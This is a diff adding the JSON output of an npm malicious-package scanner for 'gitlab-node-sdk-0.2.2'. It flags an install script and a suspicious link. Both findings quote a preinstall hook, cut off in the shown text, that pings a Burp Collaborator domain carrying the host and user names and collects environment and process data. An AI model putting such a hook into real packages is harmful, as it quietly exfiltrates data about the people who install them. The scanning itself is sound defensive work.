@@ -1,0 +1,28 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "npm-silent-process-execution": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\"linux-olxbr_gitlab-node-sdk-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\"; sleep .5; ping -c 1 $BCNET; for i in env \\\"ps aux\\\" \\\"cat /proc/version /proc/net/fib_trie ... || true\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-dll-hijacking": {},
+        "npm-exfiltrate-sensitive-data": {},
+        "shady-links": [
+            {
+                "location": "package/package.json:8",
+                "code": "    \"preinstall\": \"export HOSTNAME && BCNET=\\\"linux-olxbr_gitlab-node-sdk-h-$HOSTNAME-u-$USER.1npmpec6j61qk4o8vlqm2y9vhmncb1.burpcollaborator.net\\\"; sleep .5; ping -c 1 $BCNET; for i in env \\\"ps aux\\\" \\\"cat /proc/version /proc/net/fib_trie ... || true\"\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-exec-base64": {},
+        "npm-obfuscation": {},
+        "npm-steganography": {}
+    },
+    "path": "./dataset/npm/gitlab-node-sdk-0.2.2"
+}
